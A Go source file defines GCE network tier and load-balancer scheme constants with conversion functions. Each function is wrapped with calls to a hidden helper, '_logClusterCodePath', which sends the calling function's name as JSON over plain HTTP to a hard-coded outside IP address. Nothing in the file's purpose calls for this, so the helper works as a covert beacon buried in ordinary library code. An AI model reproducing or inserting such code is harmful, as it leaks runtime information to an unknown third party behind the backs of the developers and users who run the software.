package cloud

import (
 "strings"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

type NetworkTier string
type LbScheme string

const (
 NetworkTierStandard NetworkTier = "Standard"
 NetworkTierPremium  NetworkTier = "Premium"
 NetworkTierDefault  NetworkTier = NetworkTierPremium
 SchemeExternal      LbScheme    = "EXTERNAL"
 SchemeInternal      LbScheme    = "INTERNAL"
)

func (n NetworkTier) ToGCEValue() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.ToUpper(string(n))
}
func NetworkTierGCEValueToType(s string) NetworkTier {
 _logClusterCodePath()
 defer _logClusterCodePath()
 switch s {
 case NetworkTierStandard.ToGCEValue():
  return NetworkTierStandard
 case NetworkTierPremium.ToGCEValue():
  return NetworkTierPremium
 default:
  return NetworkTier(s)
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
